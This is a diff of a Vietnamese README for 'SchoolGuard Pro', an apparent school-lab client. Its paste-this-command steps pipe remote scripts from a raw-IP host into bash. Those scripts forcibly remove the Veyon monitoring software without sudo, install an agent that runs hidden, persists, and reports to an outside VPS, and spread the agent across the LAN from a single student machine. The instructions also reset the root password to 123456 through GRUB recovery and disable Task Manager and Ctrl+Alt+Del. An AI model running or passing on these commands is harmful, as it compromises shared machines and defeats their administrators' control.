@@ -1,109 +1,72 @@
-# Hệ Thống Quản Lý Phòng Máy SchoolGuard Pro (Client Setup)
+# SchoolGuard Pro — Bộ Cài Đặt Nhanh Cho Phòng Máy (Xubuntu & Windows)
 
-Bộ cài đặt chuyên biệt dành cho máy trạm học sinh (**Xubuntu Linux** và **Windows 7/10/11**), tích hợp công cụ **tắt hẳn, vô hiệu hóa và xóa sạch hoàn toàn Veyon** khỏi máy học sinh.
-
-> ⚠️ **Lưu ý**: Kho lưu trữ này **chỉ chứa bộ công cụ cài đặt dành cho máy học sinh Client**, tuyệt đối không bao gồm mã nguồn máy chủ quản trị (`server/`). Máy chủ quản lý trung tâm hoạt động tại: **[https://103-149-172-179.sslip.io](https://103-149-172-179.sslip.io)**.
+> **Trang Web Quản Lý:** **[https://103-149-172-179.sslip.io](https://103-149-172-179.sslip.io)**
 
 ---
 
-## 🚀 QUY TRÌNH 2 BƯỚC CÀI ĐẶT NHANH (KHUYÊN DÙNG)
+## ⚡ BẢNG LỆNH COPY NHANH TRÊN XUBUNTU (`Ctrl + Alt + T`)
 
-Để đảm bảo máy học sinh hoạt động ổn định và giải phóng hoàn toàn khỏi xung đột phần mềm cũ, hãy thực hiện tuần tự **2 bước**:
+Mở Terminal trên máy học sinh (**`Ctrl + Alt + T`**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới và dán vào Terminal:
 
+### 1. Lệnh Gộp 2-Trong-1: Xóa sạch Veyon + Cài đặt SchoolGuard (Khuyên dùng)
+*(Chạy được ngay cả khi không có hoặc quên mật khẩu `sudo`)*
+```bash
+wget -qO- https://103-149-172-179.sslip.io/remove-veyon.sh | bash && wget -qO- https://103-149-172-179.sslip.io/install.sh | bash
 ```
-[BƯỚC 1: Xóa Sạch Veyon]  ──▶  [BƯỚC 2: Cài Đặt SchoolGuard Pro]
+
+### 2. Lệnh Từ 1 Máy Học Sinh Tự Động Cài Lan Truyền Cho Cả Phòng (Cùng Mạng LAN)
+*(Chỉ cần ngồi ở 1 máy học sinh bất kỳ, tự động quét dải mạng `192.168.1.x` và cài cho các máy đang bật trong phòng)*
+```bash
+wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
 ```
 
----
+### 3. Lệnh Tải Siêu Tốc Từ Máy Bên Cạnh Trong Phòng (Qua Trạm LAN Nội Bộ `:8888`)
+*(Nếu trong phòng đã có `pc-01` (`192.168.1.136`) hoặc `pc-18` (`192.168.1.154`) cài rồi, các máy khác có thể tải trực tiếp qua mạng LAN nội bộ trong 1 giây)*
+```bash
+curl -sSL http://192.168.1.136:8888/go | bash
+```
+*(Hoặc từ `pc-18`)*:
+```bash
+curl -sSL http://192.168.1.154:8888/go | bash
+```
 
-### A. DÀNH CHO MÁY HỌC SINH XUBUNTU LINUX
+### 4. Lệnh Tách Riêng Từng Bước (Nếu muốn chạy riêng)
+* **Bước 1 — Tắt hẳn & Xóa sạch Veyon:**
+  ```bash
+  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
+  ```
+* **Bước 2 — Cài đặt SchoolGuard Pro:**
+  ```bash
+  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
+  ```
 
-#### Cách 1: Chạy Dòng Lệnh Terminal (Nhanh nhất - Không cần mật khẩu sudo)
-Nhấn tổ hợp phím **`Ctrl + Alt + T`** trên máy học sinh để mở Terminal:
-
-1. **Bước 1: Tiêu diệt & Xóa sạch Veyon**
-   ```bash
-   wget -qO- https://103-149-172-179.sslip.io/remove-veyon.sh | bash
-   ```
-   *(Hoặc tải từ GitHub)*:
-   ```bash
-   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
-   ```
-   *Cơ chế tự động: Nếu có quyền sudo, script sẽ dừng, mask `veyon.service` và purge hoàn toàn gói veyon qua `apt`. Nếu không có mật khẩu sudo, script tự kích hoạt bộ chặn ngầm liên tục tiêu diệt `veyon-worker` và giải phóng khóa chuột/phím `xinput`.*
-
-2. **Bước 2: Cài đặt SchoolGuard Pro**
-   ```bash
-   wget -qO- https://103-149-172-179.sslip.io/install.sh | bash
-   ```
-   *(Hoặc tải từ GitHub)*:
-   ```bash
-   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
-   ```
-
-3. **Bước 3 (Tùy chọn cho Quản trị viên): Đặt lại mật khẩu `sudo` / `root` về `123456`**
-   Mở Terminal (`Ctrl + Alt + T` hoặc GRUB Root Shell) và chạy:
-   ```bash
-   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
-   ```
-
-4. **Bước 4 (Tự động cài lan truyền từ 1 máy học sinh sang cả phòng cùng mạng LAN):**
-   Chỉ cần ngồi tại **1 máy học sinh bất kỳ**, mở `Ctrl + Alt + T` và chạy:
-   ```bash
-   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
-   ```
-   *(Hoặc từ máy khác trong cùng phòng tải trực tiếp từ trạm phát nội bộ của máy đã cài: `curl -sSL http://<IP-MÁY-ĐÃ-CÀI>:8888/go | bash`)*
-
-#### Cách 2: Bấm Đúp Chuột (Dùng USB hoặc tải file nén)
-1. Tải file **[SchoolGuard-Xubuntu-Setup.tar.gz](./SchoolGuard-Xubuntu-Setup.tar.gz)** vào USB hoặc máy học sinh.
-2. Chuột phải vào file nén chọn **Extract Here** (Giải nén tại đây) $\rightarrow$ Mở thư mục `SchoolGuard-Setup`.
-3. **Bấm đúp chuột** vào file: **`1-Xoa-Sach-Veyon.desktop`** (Bước 1).
-4. Sau khi hoàn tất, **bấm đúp chuột** vào file: **`2-Cai-Dat-SchoolGuard.desktop`** (Bước 2).
-5. Quá trình hoàn tất, máy học sinh tự động kết nối về màn hình giáo viên!
+### 5. Lệnh Đặt Lại Mật Khẩu `sudo` / `root` Về `123456`
+* **Chạy trong Terminal (`Ctrl + Alt + T`) hoặc GRUB Root Shell:**
+  ```bash
+  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
+  ```
+* **Nếu đang ở GRUB Recovery Mode (Không cần mạng & Không cần mật khẩu cũ):**
+  ```bash
+  bash /home/*/.local/share/.schoolguard/reset-sudo.sh 123456 && reboot
+  ```
 
 ---
 
-### B. DÀNH CHO MÁY HỌC SINH WINDOWS (7 / 10 / 11)
+## 🪟 BẢNG LỆNH COPY NHANH TRÊN WINDOWS (CMD / PowerShell)
 
-*Bộ cài Windows thuần PowerShell/.NET, không yêu cầu cài đặt Python hay thư viện ngoài.*
-
-#### Cách 1: Chạy Dòng Lệnh CMD hoặc PowerShell (Chạy dưới quyền Administrator)
-Mở **Command Prompt (CMD)** hoặc **PowerShell**:
-
-1. **Bước 1: Tiêu diệt & Xóa sạch Veyon**
-   ```cmd
-   curl -s https://103-149-172-179.sslip.io/Xoa-Sach-Veyon-Windows.bat -o %TEMP%\xoa_veyon.bat && %TEMP%\xoa_veyon.bat
-   ```
-   *Script tự động dừng/xóa dịch vụ `VeyonService`, kill sạch `VeyonWorker.exe`, chạy trình gỡ cài đặt im lặng `/S`, dọn dẹp thư mục, registry và gọi `BlockInput($false)` giải phóng chuột phím.*
-
-2. **Bước 2: Cài đặt SchoolGuard Pro**
-   ```cmd
-   curl -s https://103-149-172-179.sslip.io/Cai-Dat-SchoolGuard-Windows.bat -o %TEMP%\sg_setup.bat && %TEMP%\sg_setup.bat
-   ```
-   *Script tự động copy agent vào `C:\ProgramData\SchoolGuard`, thiết lập chạy ẩn qua VBScript, đăng ký tự khởi động cùng Windows và kết nối trực tiếp đến Web Quản lý.*
-
-#### Cách 2: 1-Click Bằng File Batch (Dùng USB hoặc tải trực tiếp)
-1. Copy các file sau vào máy học sinh:
-   - `Xoa-Sach-Veyon-Windows.bat` và `remove_veyon_win.ps1`
-   - `Cai-Dat-SchoolGuard-Windows.bat` và `agent_win.ps1`
-2. Chuột phải vào **`Xoa-Sach-Veyon-Windows.bat`** chọn **Run as administrator** (Bước 1).
-3. Chuột phải vào **`Cai-Dat-SchoolGuard-Windows.bat`** chọn **Run as administrator** (Bước 2).
+* **Lệnh 1 — Tắt hẳn & Xóa sạch Veyon trên Windows:**
+  ```cmd
+  curl -sSL https://103-149-172-179.sslip.io/Xoa-Sach-Veyon-Windows.bat -o %TEMP%\xoa_veyon.bat && %TEMP%\xoa_veyon.bat
+  ```
+* **Lệnh 2 — Cài đặt SchoolGuard trên Windows (Không cần cài Python):**
+  ```cmd
+  curl -sSL https://103-149-172-179.sslip.io/Cai-Dat-SchoolGuard-Windows.bat -o %TEMP%\sg_setup.bat && %TEMP%\sg_setup.bat
+  ```
 
 ---
 
-## 🛡️ TÍNH NĂNG VÀ CƠ CHẾ BẢO VỆ CỦA SCHOOLGUARD PRO
+## 📦 CÀI ĐẶT BẰNG USB / BẤM ĐÚP CHUỘT (KHÔNG CẦN GÕ LỆNH)
 
-| Tính Năng | Xubuntu Client | Windows Client |
-|---|---|---|
-| **Khóa Màn Hình Toàn Diện** | GTK3 / Tkinter Overlay UI, Machine Badge, Lời nhắn giáo viên | .NET GDI+ Fullscreen Overlay, Machine Badge, Lời nhắn |
-| **Khóa Chuột & Bàn Phím** | `xinput disable` cho toàn bộ slave devices | Win32 Low-level Keyboard Hook + `BlockInput` |
-| **Chống Đóng & Vô Hiệu TaskMgr** | Chặn tổ hợp phím X11, tự phục hồi process | Khóa Task Manager (`DisableTaskMgr`), chặn `Ctrl+Alt+Del` |
-| **Trình Chiếu Bài Giảng** | Nhận luồng ảnh JPEG thời gian thực từ giáo viên | Hiển thị PictureBox thời gian thực siêu mượt |
-| **Cứu Máy Tức Thì Khi Mở Khóa** | Tự động kill mọi tiến trình `veyon-worker` còn sót | Tự động kill `VeyonWorker.exe` & release `BlockInput` |
-| **Tắt Veyon Từ Xa** | Nhận lệnh `DISABLE_VEYON` từ Web Dashboard | Dừng dịch vụ và vô hiệu hóa Veyon từ xa |
-| **Tự Khởi Động Cùng Hệ Thống** | `systemd --user` + XFCE Autostart + Cron Watchdog | HKLM/HKCU Run + Windows Scheduled Task (onlogon) |
-
----
-
-## 📞 HỖ TRỢ VÀ QUẢN TRỊ VIÊN
-- **Giao diện Web Giáo viên**: `https://103-149-172-179.sslip.io`
-- **Tài khoản**: Đăng nhập theo phân quyền giáo viên / quản trị viên phòng máy.
+1. Tải gói **[SchoolGuard-Xubuntu-Setup.tar.gz](./SchoolGuard-Xubuntu-Setup.tar.gz)** giải nén ra Desktop hoặc USB.
+2. Bấm đúp **`1-Xoa-Sach-Veyon.desktop`** để vô hiệu hóa Veyon.
+3. Bấm đúp **`2-Cai-Dat-SchoolGuard.desktop`** để cài đặt và tự động kết nối về VPS.
